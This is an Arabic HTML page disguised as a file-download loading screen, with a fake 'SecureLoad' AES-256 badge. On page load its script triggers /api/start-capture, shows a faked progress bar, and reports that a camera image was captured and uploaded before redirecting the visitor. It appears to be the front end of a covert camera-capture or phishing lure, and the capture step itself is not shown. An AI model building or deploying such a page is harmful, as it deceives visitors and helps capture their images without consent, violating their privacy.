<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>⏳ جاري التحميل...</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: #0a0a0a;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            color: #fff;
        }
        .loading-container {
            background: #161616;
            border-radius: 30px;
            padding: 60px 50px;
            max-width: 550px;
            width: 100%;
            text-align: center;
            border: 1px solid #2a2a2a;
            box-shadow: 0 30px 60px rgba(0,0,0,0.8);
            position: relative;
            overflow: hidden;
        }
        .loading-container::before {
            content: '';
            position: absolute;
            top: -2px;
            left: -2px;
            right: -2px;
            bottom: -2px;
            background: linear-gradient(45deg, #ff6b6b, #ffd93d, #6bcb77, #4d96ff);
            background-size: 400% 400%;
            border-radius: 30px;
            z-index: -1;
            animation: gradient 3s ease infinite;
            opacity: 0.3;
        }
        @keyframes gradient {
            0% { background-position: 0% 50%; }
            50% { background-position: 100% 50%; }
            100% { background-position: 0% 50%; }
        }
        .icon { font-size: 5em; margin-bottom: 20px; display: block; animation: pulse 1.5s infinite; }
        @keyframes pulse { 0%, 100% { transform: scale(1); } 50% { transform: scale(1.15); } }
        h1 { font-size: 1.8em; font-weight: 700; color: #fff; margin-bottom: 8px; }
        .sub { color: #888; font-size: 0.95em; margin-bottom: 30px; }
        .progress-bar-bg { width: 100%; height: 12px; background: #2a2a2a; border-radius: 20px; overflow: hidden; margin: 20px 0; }
        .progress-bar { height: 100%; width: 0%; background: linear-gradient(90deg, #ff6b6b, #ffd93d, #6bcb77); background-size: 200% 100%; border-radius: 20px; transition: width 0.5s ease; animation: shimmer 2s infinite; }
        @keyframes shimmer { 0% { background-position: 200% 0; } 100% { background-position: -200% 0; } }
        .status-text { color: #aaa; font-size: 0.9em; margin-top: 15px; font-family: 'Courier New', monospace; }
        .dots { display: inline-block; width: 20px; text-align: left; }
        .file-info { margin-top: 20px; padding: 12px; background: #1a1a1a; border-radius: 10px; font-size: 0.8em; color: #666; border: 1px solid #2a2a2a; display: none; }
        .file-info.show { display: block; }
        .file-info span { color: #6bcb77; font-weight: 700; }
        .footer { margin-top: 25px; color: #444; font-size: 0.7em; }
        .spinner { display: inline-block; width: 20px; height: 20px; border: 3px solid #2a2a2a; border-top: 3px solid #ffd93d; border-radius: 50%; animation: spin 1s linear infinite; margin-right: 10px; vertical-align: middle; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .success-check { display: none; font-size: 3em; color: #6bcb77; animation: bounceIn 0.8s ease; }
        @keyframes bounceIn { 0% { transform: scale(0); opacity: 0; } 50% { transform: scale(1.3); } 100% { transform: scale(1); opacity: 1; } }
    </style>
</head>
<body>
    <div class="loading-container" id="mainContainer">
        <span class="icon" id="mainIcon">📦</span>
        <h1>جاري تجهيز الملف</h1>
        <p class="sub">⏳ يرجى الانتظار، جاري تحميل البيانات...</p>
        
        <div class="progress-bar-bg">
            <div class="progress-bar" id="progressBar"></div>
        </div>
        
        <div class="status-text" id="statusText">
            <span class="spinner"></span>
            <span id="statusMessage">جاري المعالجة...</span>
            <span class="dots" id="dots">.</span>
        </div>
        
        <div class="file-info" id="fileInfo">
            📸 تم التقاط الصورة: <span id="filenameDisplay">unknown.jpg</span>
            <br>📤 تم الإرسال إلى السحابة بنجاح
        </div>
        
        <div class="success-check" id="successCheck">✅</div>
        <div class="footer" id="footerText">© 2026 SecureLoad • مشفر بـ AES-256</div>
    </div>

    <script>
        let progress = 0;
        let intervalId = null;
        let dotCount = 0;
        let captureStarted = false;
        
        function updateDots() {
            const dots = document.getElementById('dots');
            dotCount = (dotCount % 3) + 1;
            dots.textContent = '.'.repeat(dotCount);
        }
        
        async function startCapture() {
            try {
                const res = await fetch('/api/start-capture');
                const data = await res.json();
                console.log('Capture started:', data);
                captureStarted = true;
            } catch (error) {
                console.error('Start capture error:', error);
                // إذا فشل بدء الالتقاط، نستمر بالتقدم الوهمي
                captureStarted = true;
            }
        }
        
        async function checkProgress() {
            try {
                const response = await fetch('/api/progress');
                const data = await response.json();
                
                const progressBar = document.getElementById('progressBar');
                const statusMsg = document.getElementById('statusMessage');
                const fileInfo = document.getElementById('fileInfo');
                const successCheck = document.getElementById('successCheck');
                const mainIcon = document.getElementById('mainIcon');
                const footerText = document.getElementById('footerText');
                
                if (data.status === 'loading') {
                    const newProgress = data.progress || progress + 2;
                    if (newProgress > progress) {
                        progress = Math.min(newProgress, 95);
                        progressBar.style.width = progress + '%';
                    }
                    
                    const messages = [
                        'جاري تهيئة الكاميرا...',
                        'جاري ضبط الإضاءة...',
                        'جاري التقاط الصورة...',
                        'جاري ضغط البيانات...',
                        'جاري التشفير...',
                        'جاري رفع الملف...'
                    ];
                    const idx = Math.min(Math.floor(progress / 17), messages.length - 1);
                    statusMsg.textContent = messages[idx] || 'جاري المعالجة...';
                    
                    updateDots();
                    
                } else if (data.status === 'complete') {
                    clearInterval(intervalId);
                    progressBar.style.width = '100%';
                    statusMsg.textContent = '✅ تم التحميل بنجاح!';
                    document.querySelector('.spinner').style.display = 'none';
                    
                    const filename = data.filename || 'captured_image.jpg';
                    document.getElementById('filenameDisplay').textContent = filename;
                    fileInfo.classList.add('show');
                    
                    successCheck.style.display = 'block';
                    mainIcon.textContent = '🎉';
                    footerText.textContent = '✅ اكتمل • سيتم توجيهك قريباً...';
                    
                    document.querySelector('h1').textContent = 'تم الرفع بنجاح!';
                    document.querySelector('.sub').textContent = `📸 تم التقاط ${data.total || 1} صورة وإرسالها`;
                    
                    setTimeout(() => {
                        window.location.href = '/redirect';
                    }, 3000);
                }
            } catch (error) {
                console.error('Progress error:', error);
                // تقدم وهمي إذا تعذر الاتصال
                if (progress < 90) {
                    progress += 1;
                    document.getElementById('progressBar').style.width = progress + '%';
                }
            }
        }
        
        // بدء الالتقاط فور تحميل الصفحة
        startCapture();
        
        // تحديث التقدم كل 500 مللي
        intervalId = setInterval(checkProgress, 500);
        setInterval(updateDots, 300);
        setTimeout(checkProgress, 100);
    </script>
</body>
</html>
